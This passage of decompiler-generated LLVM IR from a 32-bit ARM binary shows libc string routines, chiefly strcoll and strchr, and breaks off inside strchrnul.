  store i32 %v5_19054, i32* @ip, align 4
  %v3_19058 = mul i32 %v9_19048, 16777216
  %v4_1905c = udiv i32 %v6_19048, 256
  %v5_1905c = or i32 %v3_19058, %v4_1905c
  store i32 %v5_1905c, i32* %r5.global-to-local, align 4
  %v3_19060 = mul i32 %v6_19048, 16777216
  %v4_19064 = udiv i32 %v3_19048, 256
  %v5_19064 = or i32 %v3_19060, %v4_19064
  store i32 %v5_19064, i32* %r4.global-to-local, align 4
  %v1_19068 = add i32 %v0_19068, -16
  %v2_19068 = inttoptr i32 %v1_19068 to i32*
  store i32 %v5_19064, i32* %v2_19068, align 4
  %v4_19068 = add i32 %v0_19068, -12
  %v5_19068 = inttoptr i32 %v4_19068 to i32*
  %v6_19068 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_19068, i32* %v5_19068, align 4
  %v7_19068 = add i32 %v0_19068, -8
  %v8_19068 = inttoptr i32 %v7_19068 to i32*
  %v9_19068 = load i32, i32* @ip, align 4
  store i32 %v9_19068, i32* %v8_19068, align 4
  %v10_19068 = add i32 %v0_19068, -4
  %v11_19068 = inttoptr i32 %v10_19068 to i32*
  %v12_19068 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_19068, i32* %v11_19068, align 4
  store i32 %v1_19068, i32* %r0.global-to-local, align 4
  %v0_1906c = load i32, i32* %r2.global-to-local, align 4
  %v2_1906c = add i32 %v0_1906c, -16
  store i32 %v2_1906c, i32* %r2.global-to-local, align 4
  %v6_19070 = icmp slt i32 %v0_1906c, 16
  br i1 %v6_19070, label %dec_label_pc_19074, label %dec_label_pc_19044.dec_label_pc_19044_crit_edge

dec_label_pc_19044.dec_label_pc_19044_crit_edge:  ; preds = %dec_label_pc_19044
  %v0_19044.pre = load i32, i32* @r3, align 4
  %v0_19048.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19044

dec_label_pc_19074:                               ; preds = %dec_label_pc_19044
  %v2_19074 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19074, i32* @r4, align 4
  %v5_19074 = load i8*, i8** %stack_var_-8, align 4
  %v6_19074 = ptrtoint i8* %v5_19074 to i32
  store i32 %v6_19074, i32* @r5, align 4
  store i32 %v11_19040, i32* @lr, align 4
  %v2_19078 = add i32 %v0_1906c, -4
  store i32 %v2_19078, i32* %r2.global-to-local, align 4
  %v4_19078 = add i32 %v0_1906c, 2147483632
  %v5_19078 = and i32 %v2_19078, %v4_19078
  %v6_19078 = icmp slt i32 %v5_19078, 0
  store i1 %v6_19078, i1* %cpsr_v.global-to-local, align 1
  %v7_19078 = icmp slt i32 %v2_19078, 0
  store i1 %v7_19078, i1* %cpsr_n.global-to-local, align 1
  %v8_19078 = icmp eq i32 %v2_19078, 0
  store i1 %v8_19078, i1* %cpsr_z.global-to-local, align 1
  %v5_1907c = icmp slt i32 %v2_1906c, -12
  br i1 %v5_1907c, label %dec_label_pc_19098, label %dec_label_pc_19080

dec_label_pc_19080:                               ; preds = %dec_label_pc_19074, %dec_label_pc_19034, %dec_label_pc_19080
  %v1_1908c = phi i32 [ %v5_1908c, %dec_label_pc_19080 ], [ %v1_19068, %dec_label_pc_19074 ], [ %v0_18f9019, %dec_label_pc_19034 ]
  %v0_19080 = load i32, i32* @r3, align 4
  %v3_19080 = mul i32 %v0_19080, 16777216
  store i32 %v3_19080, i32* %ip.global-to-local, align 4
  %v0_19084 = load i32, i32* %r1.global-to-local, align 4
  %v1_19084 = add i32 %v0_19084, -4
  %v2_19084 = inttoptr i32 %v1_19084 to i32*
  %v3_19084 = load i32, i32* %v2_19084, align 4
  store i32 %v3_19084, i32* @r3, align 4
  store i32 %v1_19084, i32* %r1.global-to-local, align 4
  %v4_19088 = udiv i32 %v3_19084, 256
  %v5_19088 = or i32 %v4_19088, %v3_19080
  store i32 %v5_19088, i32* @ip, align 4
  %v2_1908c = add i32 %v1_1908c, -4
  %v3_1908c = inttoptr i32 %v2_1908c to i32*
  store i32 %v5_19088, i32* %v3_1908c, align 4
  %v4_1908c = load i32, i32* %r0.global-to-local, align 4
  %v5_1908c = add i32 %v4_1908c, -4
  store i32 %v5_1908c, i32* %r0.global-to-local, align 4
  %v0_19090 = load i32, i32* %r2.global-to-local, align 4
  %v2_19090 = add i32 %v0_19090, -4
  store i32 %v2_19090, i32* %r2.global-to-local, align 4
  %v6_19094 = icmp slt i32 %v0_19090, 4
  br i1 %v6_19094, label %dec_label_pc_19098.loopexit, label %dec_label_pc_19080

dec_label_pc_19098.loopexit:                      ; preds = %dec_label_pc_19080
  %v4_19090 = sub i32 3, %v0_19090
  %v5_19090 = and i32 %v4_19090, %v0_19090
  %v6_19090 = icmp slt i32 %v5_19090, 0
  %v7_19090 = icmp slt i32 %v2_19090, 0
  store i1 %v6_19090, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19090, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19098

dec_label_pc_19098:                               ; preds = %dec_label_pc_19098.loopexit, %dec_label_pc_19074
  %v2_18f0453 = phi i32 [ %v5_1908c, %dec_label_pc_19098.loopexit ], [ %v1_19068, %dec_label_pc_19074 ]
  %v0_18ef449 = phi i32 [ %v2_19090, %dec_label_pc_19098.loopexit ], [ %v2_19078, %dec_label_pc_19074 ]
  %v0_19098 = load i32, i32* %r1.global-to-local, align 4
  %v1_19098 = add i32 %v0_19098, 1
  store i32 %v1_19098, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1908c, { 0, 2, 1 }
  uselistorder i32 %v3_19080, { 1, 0 }
  uselistorder i32 %v2_19078, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19068, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_19048, { 1, 0 }
  uselistorder i32 %v3_19044, { 1, 0 }
  uselistorder i32 %v0_19048, { 3, 2, 1, 0 }
  uselistorder i32 %v0_19068, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19020, { 0, 2, 1 }
  uselistorder i32 %v3_19014, { 1, 0 }
  uselistorder i32 %v2_1900c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18ffc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18fdc, { 1, 0 }
  uselistorder i32 %v3_18fd8, { 1, 0 }
  uselistorder i32 %v0_18fdc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18ffc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18fb4, { 0, 2, 1 }
  uselistorder i32 %v3_18fa8, { 1, 0 }
  uselistorder i32 %v2_18fa0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18f90, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18f70, { 1, 0 }
  uselistorder i32 %v3_18f6c, { 1, 0 }
  uselistorder i32 %v0_18f70, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18f90, { 3, 2, 1, 0 }
  uselistorder i1 %v5_19038, { 2, 0, 1 }
  uselistorder i32 %v0_18f50, { 1, 0 }
  uselistorder i32 %v0_1903c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_18f9019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18f40, { 2, 1, 0 }
  uselistorder i32 %v0_18f40, { 2, 0, 1 }
  uselistorder i32 %v2_18f38, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18f38, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18f38, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_18f9020, { 2, 1, 0 }
  uselistorder i32 %v11_18f14, { 1, 0 }
  uselistorder i32 %v7_18f14, { 1, 0 }
  uselistorder i32 %v1_18ef4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_18ef4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18ef8, { 1, 0 }
  uselistorder i32 %v7_18eec, { 0, 2, 1 }
  uselistorder i32 %v10_18ee8, { 1, 0 }
  uselistorder i32 %v9_18ee0, { 1, 0, 2 }
  uselistorder i32 %v6_18edc, { 1, 0 }
  uselistorder i32 %v2_18ed4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_18ed4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_18ee4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18ec8, { 0, 2, 1 }
  uselistorder i32 %v13_18ec4, { 1, 0 }
  uselistorder i32 %v4_18ec0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_18ec0, { 2, 0, 1 }
  uselistorder i32 %v6_18ec8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18eb8, { 0, 2, 1 }
  uselistorder i32 %v16_18eb4, { 1, 0 }
  uselistorder i32 %v4_18eb0, { 1, 2, 0 }
  uselistorder i32 %v0_18ec0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_18eb8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18ea4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_18ea0, { 1, 0 }
  uselistorder i32 %v1_18e9c, { 1, 0 }
  uselistorder i32 %v10_18e98, { 1, 0 }
  uselistorder i32 %v0_18e98, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18e9c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_18e90, { 0, 2, 1 }
  uselistorder i32 %v2_18e84, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18e84, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_18e9c37, { 1, 2, 0 }
  uselistorder i32 %v1_18e7c, { 2, 1, 0 }
  uselistorder i32 %v1_18e74, { 2, 3, 1, 0 }
  uselistorder i32 %v2_18e6c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_18e68, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_18e64, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_18e64, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_18e54, { 0, 2, 1 }
  uselistorder i32 %v4_18e50, { 1, 0 }
  uselistorder i32 %v3_18e44, { 1, 0 }
  uselistorder i32 %v1_18e3c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18e30, { 1, 0 }
  uselistorder i32 %v12_18e2c, { 0, 2, 1 }
  uselistorder i32 %v8_18e0c, { 1, 0, 2 }
  uselistorder i32 %v5_18e0c, { 1, 0, 2 }
  uselistorder i32 %v2_18e0c, { 1, 0, 2 }
  uselistorder i32 %v0_18e0c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18e2c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_18de8, { 0, 2, 1 }
  uselistorder i32 %v4_18de4, { 1, 0 }
  uselistorder i32 %v3_18dd8, { 1, 0 }
  uselistorder i32 %v1_18dd0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18dc4, { 1, 0 }
  uselistorder i32 %v12_18dc0, { 0, 2, 1 }
  uselistorder i32 %v8_18da0, { 1, 0, 2 }
  uselistorder i32 %v5_18da0, { 1, 0, 2 }
  uselistorder i32 %v2_18da0, { 1, 0, 2 }
  uselistorder i32 %v0_18da0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18dc0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_18d7c, { 0, 2, 1 }
  uselistorder i32 %v4_18d78, { 1, 0 }
  uselistorder i32 %v3_18d6c, { 1, 0 }
  uselistorder i32 %v1_18d64, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18d58, { 1, 0 }
  uselistorder i32 %v12_18d54, { 0, 2, 1 }
  uselistorder i32 %v8_18d34, { 1, 0, 2 }
  uselistorder i32 %v5_18d34, { 1, 0, 2 }
  uselistorder i32 %v2_18d34, { 1, 0, 2 }
  uselistorder i32 %v0_18d34, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18d54, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_18d90, { 0, 2, 1 }
  uselistorder i32 %v1_18d8c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_18d10, { 2, 0, 1, 3 }
  uselistorder i32 %v2_18d10, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18d94, { 1, 0, 3, 2 }
  uselistorder i32 %v0_18e2c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_18d04, { 1, 0 }
  uselistorder i32 %v0_18d04, { 3, 1, 0, 2 }
  uselistorder i32 %v2_18cfc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_18cfc, { 1, 0, 2 }
  uselistorder i32 %v0_18cfc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18e2c77, { 1, 0 }
  uselistorder i32 %v1_18cdc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_18ce4, { 1, 0 }
  uselistorder i32 %v0_18cb8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_18cac, { 1, 2, 0, 3 }
  uselistorder i32 %v5_18c98, { 1, 0, 2 }
  uselistorder i32 %v1_18c94, { 1, 0 }
  uselistorder i32 %v1_18c8c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_18c8c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18c84, { 0, 2, 1 }
  uselistorder i32 %v3_18c84, { 3, 0, 1, 2 }
  uselistorder i1 %v0_18c84, { 1, 0 }
  uselistorder i1 %v1_18c84, { 1, 0 }
  uselistorder i32 %v3_18c80, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18c78, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18c64, { 1, 2, 0 }
  uselistorder i32 %v1_18c5c, { 0, 2, 1 }
  uselistorder i32 %v12_18c58, { 0, 1, 3, 2 }
  uselistorder i32 %v0_18c4c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18c50, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_18c40, { 0, 2, 1 }
  uselistorder i32 %v1_18c38, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18c38, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_18c30, { 1, 0 }
  uselistorder i32 %v1_18c28, { 2, 1, 0 }
  uselistorder i32 %v2_18c20, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_18c20, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_18c1c, { 1, 0 }
  uselistorder i32 %v2_18c10, { 1, 0 }
  uselistorder i32 %v1_18c10, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_18c10, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 48, 47, 56, 49, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24, 25 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 6, 5 }
  uselistorder i32 27, { 1, 0, 2, 6, 3, 7, 4, 8, 5, 9 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 60, 61, 62, 6, 18, 19, 20, 63, 64, 65, 7, 21, 22, 23, 66, 67, 68, 8, 24, 25, 69, 16, 15, 70, 71, 72, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 73, 10, 33, 47, 48, 49, 9, 50, 51, 52, 34, 46, 2, 35, 40, 41, 42, 43, 44, 45, 0, 1, 53, 54, 55, 56, 57, 58, 59, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_19080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19014, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18fa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18f48, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_18ed4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_18e98, { 1, 0 }
  uselistorder label %dec_label_pc_18e84, { 1, 0 }
  uselistorder label %dec_label_pc_18e44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18dd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18d6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18d0c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_18cdc, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_18c78, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_18c38, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_190a4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_190a4 = phi i32 [ %v0_190a4.pre, %bb ], [ %v5_190a4, %bb3 ]
  %v0_190a0 = phi i32 [ %tmp, %bb ], [ %v5_190a0, %bb3 ]
  %v1_190a0 = inttoptr i32 %v0_190a0 to i8*
  %v2_190a0 = load i8, i8* %v1_190a0, align 1
  %v1_190a4 = inttoptr i32 %v0_190a4 to i8*
  %v2_190a4 = load i8, i8* %v1_190a4, align 1
  %v3_190a4 = zext i8 %v2_190a4 to i32
  %v2_190a8 = icmp eq i8 %v2_190a0, 0
  br i1 %v2_190a8, label %.dec_label_pc_190b4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_190a4 = add i32 %v0_190a4, 1
  %v5_190a0 = add i32 %v0_190a0, 1
  %v3_190a0 = zext i8 %v2_190a0 to i32
  %v10_190ac = icmp eq i8 %v2_190a0, %v2_190a4
  br i1 %v10_190ac, label %entry, label %dec_label_pc_190b4

.dec_label_pc_190b4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_190b4

dec_label_pc_190b4:                               ; preds = %bb3, %.dec_label_pc_190b4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_190b4_crit_edge ], [ %v3_190a0, %bb3 ]
  %v2_190b4.pre-phi = sub nsw i32 %.pn, %v3_190a4
  ret i32 %v2_190b4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_190a0, { 0, 2, 1 }
  uselistorder i32 %v0_190a0, { 1, 0 }
  uselistorder i32 %v0_190a4, { 1, 0 }
  uselistorder label %dec_label_pc_190b4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_19124 = urem i32 %arg1, 256
  %v0_191443 = load i32, i32* @r0, align 4
  %v1_191444 = urem i32 %v0_191443, 4
  %v2_191445 = icmp eq i32 %v1_191444, 0
  br i1 %v2_191445, label %dec_label_pc_1914c, label %dec_label_pc_1912c

dec_label_pc_1912c:                               ; preds = %entry, %dec_label_pc_19140
  %v0_19140 = phi i32 [ %v1_19140, %dec_label_pc_19140 ], [ %v0_191443, %entry ]
  %v1_1912c = inttoptr i32 %v0_19140 to i8*
  %v2_1912c = load i8, i8* %v1_1912c, align 1
  %v3_1912c = zext i8 %v2_1912c to i32
  %v9_19130 = icmp eq i32 %v3_1912c, %v1_19124
  br i1 %v9_19130, label %dec_label_pc_19200, label %dec_label_pc_19138

dec_label_pc_19138:                               ; preds = %dec_label_pc_1912c
  %v2_19138 = icmp eq i8 %v2_1912c, 0
  br i1 %v2_19138, label %dec_label_pc_191fc, label %dec_label_pc_19140

dec_label_pc_19140:                               ; preds = %dec_label_pc_19138
  %v1_19140 = add i32 %v0_19140, 1
  %v1_19144 = urem i32 %v1_19140, 4
  %v2_19144 = icmp eq i32 %v1_19144, 0
  br i1 %v2_19144, label %dec_label_pc_1914c, label %dec_label_pc_1912c

dec_label_pc_1914c:                               ; preds = %dec_label_pc_19140, %entry
  %v0_19150 = phi i32 [ %v0_191443, %entry ], [ %v1_19140, %dec_label_pc_19140 ]
  %v4_1914c = mul nuw nsw i32 %v1_19124, 256
  %v5_1914c = or i32 %v4_1914c, %v1_19124
  %v4_19154 = mul i32 %v5_1914c, 65536
  %v5_19154 = or i32 %v4_19154, %v5_1914c
  br label %dec_label_pc_19158

dec_label_pc_19158:                               ; preds = %dec_label_pc_191f4, %dec_label_pc_19194, %dec_label_pc_1914c
  %v0_191bc = phi i32 [ %v0_19150, %dec_label_pc_1914c ], [ %v4_19158, %dec_label_pc_19194 ], [ %v4_19158, %dec_label_pc_191f4 ]
  %v1_19158 = inttoptr i32 %v0_191bc to i32*
  %v2_19158 = load i32, i32* %v1_19158, align 4
  %v4_19158 = add i32 %v0_191bc, 4
  %v2_19160 = xor i32 %v2_19158, %v5_19154
  %v2_1916c = add i32 %v2_19158, 2130640639
  %v1_19170 = sub i32 -1, %v2_19158
  %v2_19174 = xor i32 %v2_1916c, %v1_19170
  %v2_19180 = and i32 %v2_19174, -2130640640
  store i32 %v2_19180, i32* @r1, align 4
  %v2_19188 = icmp eq i32 %v2_19180, 0
  br i1 %v2_19188, label %dec_label_pc_19194, label %dec_label_pc_1919c

dec_label_pc_19194:                               ; preds = %dec_label_pc_19158
  %v2_19164 = add i32 %v2_19160, 2130640639
  %v1_1917c = sub i32 -1, %v2_19160
  %v2_19184 = xor i32 %v2_19164, %v1_1917c
  %v2_1918c = and i32 %v2_19184, -2130640640
  %v2_19194 = icmp eq i32 %v2_1918c, 0
  br i1 %v2_19194, label %dec_label_pc_19158, label %dec_label_pc_1919c

dec_label_pc_1919c:                               ; preds = %dec_label_pc_19158, %dec_label_pc_19194
  %v2_1919c = inttoptr i32 %v0_191bc to i8*
  %v3_1919c = load i8, i8* %v2_1919c, align 1
  %v4_1919c = zext i8 %v3_1919c to i32
  %v9_191a0 = icmp eq i32 %v4_1919c, %v1_19124
  br i1 %v9_191a0, label %dec_label_pc_19200, label %dec_label_pc_191ac

dec_label_pc_191ac:                               ; preds = %dec_label_pc_1919c
  %v2_191ac = icmp eq i8 %v3_1919c, 0
  br i1 %v2_191ac, label %dec_label_pc_191fc, label %dec_label_pc_191b4

dec_label_pc_191b4:                               ; preds = %dec_label_pc_191ac
  %v1_191b4 = add i32 %v0_191bc, 1
  %v2_191b4 = inttoptr i32 %v1_191b4 to i8*
  %v3_191b4 = load i8, i8* %v2_191b4, align 1
  %v4_191b4 = zext i8 %v3_191b4 to i32
  %v9_191b8 = icmp eq i32 %v4_191b4, %v1_19124
  br i1 %v9_191b8, label %dec_label_pc_19200, label %dec_label_pc_191c4

dec_label_pc_191c4:                               ; preds = %dec_label_pc_191b4
  %v2_191c4 = icmp eq i8 %v3_191b4, 0
  br i1 %v2_191c4, label %dec_label_pc_191fc, label %dec_label_pc_191cc

dec_label_pc_191cc:                               ; preds = %dec_label_pc_191c4
  %v1_191cc = add i32 %v0_191bc, 2
  %v2_191cc = inttoptr i32 %v1_191cc to i8*
  %v3_191cc = load i8, i8* %v2_191cc, align 1
  %v4_191cc = zext i8 %v3_191cc to i32
  %v9_191d0 = icmp eq i32 %v4_191cc, %v1_19124
  br i1 %v9_191d0, label %dec_label_pc_19200, label %dec_label_pc_191dc

dec_label_pc_191dc:                               ; preds = %dec_label_pc_191cc
  %v2_191dc = icmp eq i8 %v3_191cc, 0
  br i1 %v2_191dc, label %dec_label_pc_191fc, label %dec_label_pc_191e4

dec_label_pc_191e4:                               ; preds = %dec_label_pc_191dc
  %v1_191e4 = add i32 %v0_191bc, 3
  %v2_191e4 = inttoptr i32 %v1_191e4 to i8*
  %v3_191e4 = load i8, i8* %v2_191e4, align 1
  %v4_191e4 = zext i8 %v3_191e4 to i32
  %v9_191e8 = icmp eq i32 %v4_191e4, %v1_19124
  br i1 %v9_191e8, label %dec_label_pc_19200, label %dec_label_pc_191f4

dec_label_pc_191f4:                               ; preds = %dec_label_pc_191e4
  %v2_191f4 = icmp eq i8 %v3_191e4, 0
  br i1 %v2_191f4, label %dec_label_pc_191fc, label %dec_label_pc_19158

dec_label_pc_191fc:                               ; preds = %dec_label_pc_19138, %dec_label_pc_191f4, %dec_label_pc_191dc, %dec_label_pc_191c4, %dec_label_pc_191ac
  br label %dec_label_pc_19200

dec_label_pc_19200:                               ; preds = %dec_label_pc_1912c, %dec_label_pc_191e4, %dec_label_pc_191cc, %dec_label_pc_191b4, %dec_label_pc_1919c, %dec_label_pc_191fc
  %v1_19204 = phi i32 [ 0, %dec_label_pc_191fc ], [ %v1_191e4, %dec_label_pc_191e4 ], [ %v1_191cc, %dec_label_pc_191cc ], [ %v1_191b4, %dec_label_pc_191b4 ], [ %v0_191bc, %dec_label_pc_1919c ], [ %v0_19140, %dec_label_pc_1912c ]
  ret i32 %v1_19204

; uselistorder directives
  uselistorder i32 %v4_19158, { 1, 0 }
  uselistorder i32 %v2_19158, { 0, 2, 1 }
  uselistorder i32 %v0_191bc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1914c, { 1, 0 }
  uselistorder i32 %v1_19140, { 1, 0, 2 }
  uselistorder i32 %v0_191443, { 2, 1, 0 }
  uselistorder i32 %v1_19124, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_19200, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_191fc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1919c, { 1, 0 }
  uselistorder label %dec_label_pc_1912c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_19214 = urem i32 %arg1, 256
  %v0_192342 = load i32, i32* @r0, align 4
  %v1_192343 = urem i32 %v0_192342, 4
  %v2_192344 = icmp eq i32 %v1_192343, 0
  br i1 %v2_192344, label %dec_label_pc_1923c, label %dec_label_pc_1921c

dec_label_pc_1921c:                               ; preds = %entry, %dec_label_pc_19230
  %v0_19230 = phi i32 [ %v1_19230, %dec_label_pc_19230 ], [ %v0_192342, %entry ]
  %v1_1921c = inttoptr i32 %v0_19230 to i8*
  %v2_1921c = load i8, i8* %v1_1921c, align 1
  %v3_1921c = zext i8 %v2_1921c to i32
  %v9_19220 = icmp eq i32 %v3_1921c, %v1_19214
  br i1 %v9_19220, label %dec_label_pc_192ec, label %dec_label_pc_19228

dec_label_pc_19228:                               ; preds = %dec_label_pc_1921c
